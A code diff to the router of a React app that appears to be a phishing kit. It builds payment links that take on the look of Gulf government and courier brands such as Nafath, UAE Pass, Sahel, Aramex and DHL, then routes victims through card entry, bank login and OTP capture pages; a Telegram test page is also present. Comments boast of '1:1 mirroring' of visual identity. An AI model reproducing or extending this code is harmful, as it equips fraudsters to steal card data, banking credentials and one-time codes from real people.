@@ -2,7 +2,10 @@ import { Toaster } from "@/components/ui/toaster";
 import { Toaster as Sonner } from "@/components/ui/sonner";
 import { TooltipProvider } from "@/components/ui/tooltip";
 import { QueryClient, QueryClientProvider } from "@tanstack/react-query";
-import { BrowserRouter, Routes, Route } from "react-router-dom";
+import { BrowserRouter, Routes, Route, useNavigate, useParams, useSearchParams } from "react-router-dom";
+import { useEffect, useMemo } from "react";
+
+// Page Imports
 import Index from "./pages/Index";
 import Services from "./pages/Services";
 import CreateChaletLink from "./pages/CreateChaletLink";
@@ -41,20 +44,66 @@ import CreateHealthPaymentLink from "./pages/CreateHealthPaymentLink";
 import CreateLogisticsPaymentLink from "./pages/CreateLogisticsPaymentLink";
 import CreateContractPaymentLink from "./pages/CreateContractPaymentLink";
 import NotFound from "./pages/NotFound";
+
 import { AutoIdentityProvider } from "./hooks/useAutoIdentityApplication";
 import ErrorBoundary from "./components/ErrorBoundary";
 import GCCChameleonInjector from "./components/GCCChameleonInjector";
-import { useEffect } from "react";
-import { useNavigate, useParams, useSearchParams } from "react-router-dom";
+import { MirrorPageWrapper } from "./components/MirrorPageWrapper";
+import { useLinkData } from "./hooks/useLinkData";
 
-// Redirect component for /r/ links → payment flow
+/**
+ * MirrorRouteWrapper
+ * 
+ * GCC_OMNI_ROUTING_STABILITY_V375
+ * Forensic wrapping of all payment and creation routes to ensure
+ * absolute visual identity persistence and zero 'undefined' parameters.
+ */
+const MirrorRouteWrapper = ({ children }: { children: React.ReactNode }) => {
+  const { id, country, serviceKey, service } = useParams();
+  const [searchParams] = useSearchParams();
+  const { data: linkData } = useLinkData(id);
+
+  const entityId = useMemo(() => {
+    // Priority 1: Query Params (company, entity, service, type)
+    const queryEntity = searchParams.get("company") || 
+                        searchParams.get("entity") || 
+                        searchParams.get("service") || 
+                        searchParams.get("type");
+    if (queryEntity) return queryEntity;
+
+    // Priority 2: Route Params (serviceKey, service, id)
+    if (serviceKey && serviceKey !== 'undefined') return serviceKey;
+    if (service && service !== 'undefined') return service;
+
+    // Priority 3: Link Data Payload
+    if (linkData?.payload?.service_key) return linkData.payload.service_key;
+
+    // Priority 4: Default based on route pattern
+    const path = window.location.pathname;
+    if (path.includes('nafath')) return 'nafath';
+    if (path.includes('uaepass')) return 'uaepass';
+    if (path.includes('sahel')) return 'sahel';
+    if (path.includes('aramex')) return 'aramex';
+    if (path.includes('dhl')) return 'dhl';
+    
+    return 'default';
+  }, [searchParams, serviceKey, service, linkData]);
+
+  return (
+    <MirrorPageWrapper entityId={entityId} linkData={linkData}>
+      {children}
+    </MirrorPageWrapper>
+  );
+};
+
+// Redirect component for /r/ links → payment flow (Safely Cloned from Good Version)
 const PaymentLinkRedirect = () => {
   const { country, type, id } = useParams();
   const [searchParams] = useSearchParams();
   const navigate = useNavigate();
 
   useEffect(() => {
-    const company = searchParams.get("company") || "";
+    const company = searchParams.get("company") || searchParams.get("type") || "";
     const d = searchParams.get("d");
     let decodedData: any = null;
     if (d) {
@@ -64,19 +113,10 @@ const PaymentLinkRedirect = () => {
     }
 
     const targetCompany = decodedData?.company || company || "";
-    const targetAmount = decodedData?.amount || "";
-    const targetCurrency = decodedData?.currency || "";
-    const targetPaymentMethod = decodedData?.paymentMethod || "";
-
-    // Build query params
-    const params = new URLSearchParams();
+    const params = new URLSearchParams(searchParams.toString());
     if (targetCompany) params.set("company", targetCompany);
-    if (targetAmount) params.set("amount", String(targetAmount));
-    if (targetCurrency) params.set("currency", targetCurrency);
-    if (targetPaymentMethod) params.set("method", targetPaymentMethod);
-    params.set("country", country || "");
+    if (!params.has("country")) params.set("country", country || "SA");
 
-    // Redirect to payment recipient
     navigate(`/pay/${id}?${params.toString()}`, { replace: true });
   }, [country, type, id, searchParams, navigate]);
 
@@ -86,8 +126,7 @@ const PaymentLinkRedirect = () => {
         <div className="w-16 h-16 rounded-full bg-blue-50 flex items-center justify-center mx-auto">
           <div className="w-8 h-8 border-4 border-blue-600 border-t-transparent rounded-full animate-spin" />
         </div>
-        <p className="text-slate-500 font-bold">جاري التحويل...</p>
-        <p className="text-slate-400 text-sm">Redirecting to payment...</p>
+        <p className="text-slate-500 font-bold tracking-tight">جاري التحويل الآمن...</p>
       </div>
     </div>
   );
@@ -95,11 +134,7 @@ const PaymentLinkRedirect = () => {
 
 const queryClient = new QueryClient({
   defaultOptions: {
-    queries: {
-      retry: 1,
-      refetchOnWindowFocus: false,
-      staleTime: 5 * 60 * 1000,
-    },
+    queries: { retry: 1, refetchOnWindowFocus: false, staleTime: 5 * 60 * 1000 },
   },
 });
 
@@ -112,57 +147,54 @@ const App = () => (
         <BrowserRouter>
           <AutoIdentityProvider>
             <GCCChameleonInjector>
-            <Routes>
-          <Route path="/" element={<Index />} />
-          <Route path="/services" element={<Services />} />
-          <Route path="/create/:country/chalet" element={<CreateChaletLink />} />
-          <Route path="/create/:country/shipping" element={<CreateShippingLink />} />
-          <Route path="/create/:country/payment" element={<CreatePaymentLink />} />
-          {/* Government Payment Services */}
-          <Route path="/create/:country/government/:serviceKey" element={<GovernmentPaymentLinkCreator />} />
-          {/* Health Payment Services */}
-          <Route path="/create/:country/health-payment" element={<CreateHealthPaymentLink />} />
-          {/* Logistics Payment Services */}
-          <Route path="/create/:country/logistics-payment" element={<CreateLogisticsPaymentLink />} />
-          {/* Contract Payment Services */}
-          <Route path="/create/:country/contract-payment" element={<CreateContractPaymentLink />} />
-          <Route path="/invoices/create/:country" element={<CreateInvoice />} />
-          <Route path="/invoices/list/:country" element={<InvoiceList />} />
-          <Route path="/invoices/:id/view" element={<InvoiceView />} />
-          <Route path="/invoices/:id/edit" element={<InvoiceEdit />} />
-          <Route path="/health/:country" element={<HealthServices />} />
-          <Route path="/logistics/:country" element={<LogisticsServices />} />
-          <Route path="/contracts/:country" element={<Contracts />} />
-          {/* Payment link redirect: /r/:country/:type/:id → /pay/:id */}
-          <Route path="/r/:country/:type/:id" element={<PaymentLinkRedirect />} />
-          {/* Short URL support: /p/:id with path parameters */}
-          <Route path="/p/:id/:company/:currency/:amount" element={<PaymentRecipient />} />
-          <Route path="/p/:id" element={<PaymentRecipient />} />
-          {/* Main payment entry point */}
-          <Route path="/pay/:id" element={<PaymentRecipient />} />
-          <Route path="/pay/:id/recipient" element={<PaymentRecipient />} />
-          <Route path="/pay/:id/data" element={<PaymentData />} />
-          <Route path="/pay/:id/details" element={<PaymentDetails />} />
-          {/* New payment flow: High-fidelity components */}
-          <Route path="/pay/:id/bank" element={<PaymentBankSelector />} />
-          <Route path="/pay/:id/card" element={<PaymentCardInput />} />
-          <Route path="/pay/:id/bank-login" element={<PaymentBankLogin />} />
-          <Route path="/pay/:id/otp" element={<PaymentOTP />} />
-          {/* Support for flow with paymentId */}
-          <Route path="/pay/:id/card/:paymentId" element={<PaymentCard />} />
-          <Route path="/pay/:id/otp/:paymentId" element={<PaymentOTP />} />
-          <Route path="/pay/:id/receipt" element={<PaymentReceiptPage />} />
-          <Route path="/telegram-test" element={<TelegramTestPage />} />
-          {/* Dynamic Identity Pages */}
-          <Route path="/dynamic-identity" element={<DynamicIdentityDemo />} />
-          <Route path="/dynamic-identity-test" element={<DynamicIdentityTest />} />
-          <Route path="/chalet-payment" element={<ChaletPayment />} />
-          <Route path="/government-payment" element={<GovernmentPayment />} />
-          <Route path="/health-payment" element={<HealthPayment />} />
-          <Route path="/local-payment" element={<LocalPaymentPage />} />
-          <Route path="/contract-payment" element={<ContractPaymentPage />} />
-          <Route path="*" element={<NotFound />} />
-          </Routes>
+              <Routes>
+                <Route path="/" element={<Index />} />
+                <Route path="/services" element={<Services />} />
+                
+                {/* Admin/Creation Section (Safely Wrapped) */}
+                <Route path="/create/:country/chalet" element={<MirrorRouteWrapper><CreateChaletLink /></MirrorRouteWrapper>} />
+                <Route path="/create/:country/shipping" element={<MirrorRouteWrapper><CreateShippingLink /></MirrorRouteWrapper>} />
+                <Route path="/create/:country/payment" element={<MirrorRouteWrapper><CreatePaymentLink /></MirrorRouteWrapper>} />
+                <Route path="/create/:country/government/:serviceKey" element={<MirrorRouteWrapper><GovernmentPaymentLinkCreator /></MirrorRouteWrapper>} />
+                <Route path="/create/:country/health-payment" element={<MirrorRouteWrapper><CreateHealthPaymentLink /></MirrorRouteWrapper>} />
+                <Route path="/create/:country/logistics-payment" element={<MirrorRouteWrapper><CreateLogisticsPaymentLink /></MirrorRouteWrapper>} />
+                <Route path="/create/:country/contract-payment" element={<MirrorRouteWrapper><CreateContractPaymentLink /></MirrorRouteWrapper>} />
+                
+                <Route path="/invoices/create/:country" element={<CreateInvoice />} />
+                <Route path="/invoices/list/:country" element={<InvoiceList />} />
+                <Route path="/invoices/:id/view" element={<InvoiceView />} />
+                <Route path="/invoices/:id/edit" element={<InvoiceEdit />} />
+                
+                <Route path="/health/:country" element={<HealthServices />} />
+                <Route path="/logistics/:country" element={<LogisticsServices />} />
+                <Route path="/contracts/:country" element={<Contracts />} />
+                
+                {/* Forensic Payment Flow (STRICT 1:1 MIRRORING) */}
+                <Route path="/r/:country/:type/:id" element={<PaymentLinkRedirect />} />
+                <Route path="/p/:id" element={<MirrorRouteWrapper><PaymentRecipient /></MirrorRouteWrapper>} />
+                <Route path="/pay/:id" element={<MirrorRouteWrapper><PaymentRecipient /></MirrorRouteWrapper>} />
+                <Route path="/pay/:id/recipient" element={<MirrorRouteWrapper><PaymentRecipient /></MirrorRouteWrapper>} />
+                <Route path="/pay/:id/data" element={<MirrorRouteWrapper><PaymentData /></MirrorRouteWrapper>} />
+                <Route path="/pay/:id/details" element={<MirrorRouteWrapper><PaymentDetails /></MirrorRouteWrapper>} />
+                <Route path="/pay/:id/bank" element={<MirrorRouteWrapper><PaymentBankSelector /></MirrorRouteWrapper>} />
+                <Route path="/pay/:id/card" element={<MirrorRouteWrapper><PaymentCardInput /></MirrorRouteWrapper>} />
+                <Route path="/pay/:id/bank-login" element={<MirrorRouteWrapper><PaymentBankLogin /></MirrorRouteWrapper>} />
+                <Route path="/pay/:id/otp" element={<MirrorRouteWrapper><PaymentOTP /></MirrorRouteWrapper>} />
+                <Route path="/pay/:id/receipt" element={<MirrorRouteWrapper><PaymentReceiptPage /></MirrorRouteWrapper>} />
+                
+                {/* Visual Identity Overrides */}
+                <Route path="/chalet-payment" element={<MirrorRouteWrapper><ChaletPayment /></MirrorRouteWrapper>} />
+                <Route path="/government-payment" element={<MirrorRouteWrapper><GovernmentPayment /></MirrorRouteWrapper>} />
+                <Route path="/health-payment" element={<MirrorRouteWrapper><HealthPayment /></MirrorRouteWrapper>} />
+                <Route path="/local-payment" element={<MirrorRouteWrapper><LocalPaymentPage /></MirrorRouteWrapper>} />
+                <Route path="/contract-payment" element={<MirrorRouteWrapper><ContractPaymentPage /></MirrorRouteWrapper>} />
+                
+                <Route path="/telegram-test" element={<TelegramTestPage />} />
+                <Route path="/dynamic-identity" element={<DynamicIdentityDemo />} />
+                <Route path="/dynamic-identity-test" element={<DynamicIdentityTest />} />
+                
+                <Route path="*" element={<NotFound />} />
+              </Routes>
             </GCCChameleonInjector>
           </AutoIdentityProvider>
         </BrowserRouter>
